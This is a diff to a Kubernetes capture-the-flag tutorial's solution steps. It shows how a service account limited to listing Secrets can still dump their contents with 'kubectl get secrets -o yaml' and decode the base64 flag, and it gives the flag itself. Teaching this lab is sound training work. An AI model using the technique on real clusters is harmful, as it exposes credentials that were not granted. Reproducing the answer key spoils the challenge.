@@ -55,18 +55,30 @@ export KUBECONFIG=./ctf-0.kubeconfig
 
 <details><summary>Solution Steps</summary>
 
-1. First, check what you can do:
+1. First, change the kubeconfig and verify that you can access with CTF permissions:
 
    ```bash
-   kubectl auth can-i --list
+   $ kubectl auth whoami
+   ATTRIBUTE   VALUE
+   Username    system:serviceaccount:ctf-0:ctf-player-0
+   UID         16f388b9-5cbd-4059-a38a-a86e2efb9817
+   Groups      [system:serviceaccounts system:serviceaccounts:ctf-0 system:authenticated]
+   ```
+
+   If the username shows `ctf-player-0`, it's successful.
+
+2. Next, check what operations you can perform in the cluster:
+
+   ```bash
+   $ kubectl auth can-i --list
    ```
 
    In the output, you'll see the following line, indicating you have List permission for Secret resources:
    ```
-   secrets                                         []                                     []               [list]
+   secrets                               []                           []            [list]
    ```
 
-2. List all Secrets in the namespace:
+3. List all Secrets in the namespace:
    ```bash
    $ kubectl get secret
    NAME                 TYPE                                  DATA   AGE
@@ -75,21 +87,21 @@ export KUBECONFIG=./ctf-0.kubeconfig
    ```
    There's a Secret named `flag-secret`. The flag string is likely inside this Secret.
 
-3. Try to get the manifest information of `flag-secret`:
+4. Try to get the manifest information of `flag-secret`:
    ```bash
    $ kubectl get secret flag-secret -o yaml
    Error from server (Forbidden): secrets "flag-secret" is forbidden: User "system:serviceaccount:ctf-0:ctf-player-0" cannot get resource "secrets" in API group "" in the namespace "ctf-0"
    ```
    However, this fails because you don't have `get` permission for Secrets.
 
-4. Now try to get the manifest information of all Secrets without specifying a particular one:
+5. Now try to get the manifest information of all Secrets without specifying a particular one:
 
    ```bash
    $ kubectl get secrets -o yaml
    ```
    This works because you're listing all Secrets, not getting a specific Secret!
 
-5. Finally, look for the flag in the output. The flag is base64 encoded, so decode it:
+6. Finally, look for the flag in the output. The flag is base64 encoded, so decode it:
    ```bash
    $ echo "Q1RGe1dlbGNvbWVfVG9fS3ViZXJuZXRlc19DVEZfVHV0b3JpYWx9" | base64 -d
    CTF{Welcome_To_Kubernetes_CTF_Tutorial}
